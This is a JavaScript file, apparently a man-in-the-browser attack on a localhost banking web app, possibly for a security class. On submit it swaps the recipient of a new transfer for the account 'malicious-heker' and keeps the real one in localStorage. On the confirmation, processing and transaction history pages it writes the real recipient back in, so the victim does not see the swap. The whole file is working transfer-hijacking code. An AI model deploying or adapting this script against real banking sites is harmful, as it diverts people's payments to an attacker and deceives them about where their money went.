let eavesdropperAccountNumber = 'malicious-heker';

localStorage.setItem('fake_account_number', eavesdropperAccountNumber);


function regex() {
    return new RegExp(eavesdropperAccountNumber, 'g');
}

if(window.location.href === 'http://localhost:8080/bank/history') {
    var table = document.getElementById("history");
    // for (var i = 0, cell; cell === table.cells[i]; i++) {
    //     cell.getElementById('receiver').value = localStorage.getItem(cell.getElementById("amount").value);
    // }
    for (let i in table.rows) {
        let row = table.rows[i]
        for (let j in row.cells) {
            let col = row.cells[j]
            if (col.innerHTML !== undefined && row.cells[0].textContent !== "Receiver") {
                row.cells[0].innerHTML = localStorage.getItem(row.cells[1].textContent)
            }

            //iterate through columns
            //columns would be accessed using the "col" variable assigned in the for loop
        }
    }
    // const receivers = document.getElementsByClassName('receiver');
    // const amounts = document.getElementsByClassName('amount');
    // for (let i = 0; i < receivers.length; i++) {
    //     receivers[i].innerHTML = localStorage.getItem(amounts[i].value)
    // }
}

if(window.location.href === 'http://localhost:8080/bank/process_confrim_transfer'){
    document.getElementById('receiver').innerHTML = localStorage.getItem('real_account_number');
}

if(window.location.href === 'http://localhost:8080/bank/process_new_transfer') {
    let data = document.getElementById('transfer_data').innerHTML;
    document.getElementById('transfer_data').innerHTML = data.replace(regex(), localStorage.getItem('real_account_number'));
}

if(window.location.href === 'http://localhost:8080/bank/new_transfer') {
    document.addEventListener('submit', () => {
        localStorage.setItem(document.getElementById('amount').value,document.getElementById('receiver').value)
        localStorage.setItem('real_account_number', document.getElementById('receiver').value);
        document.getElementById('receiver').value = localStorage.getItem('fake_account_number');
    });
}
